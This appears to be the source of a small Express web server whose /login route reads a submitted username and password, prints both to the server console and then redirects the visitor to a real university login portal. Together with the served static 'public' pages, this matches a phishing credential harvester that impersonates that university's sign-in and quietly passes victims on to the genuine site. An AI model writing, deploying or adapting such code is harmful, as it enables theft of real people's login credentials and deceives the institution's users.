import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const PORT = 3000;


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.urlencoded({extended:true}));
app.use(express.static(path.join(__dirname, "..", "public")));


app.get('/', (req, res) => {
  res.send({"file": __filename, "dir": __dirname, "?": path.join(__dirname, 'public')});
});


app.post("/login", (req, res)=>{

  const {username, password} = req.body;
  console.log(username, password);
  
  res.redirect('https://platon.vistula.edu.pl/');


});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});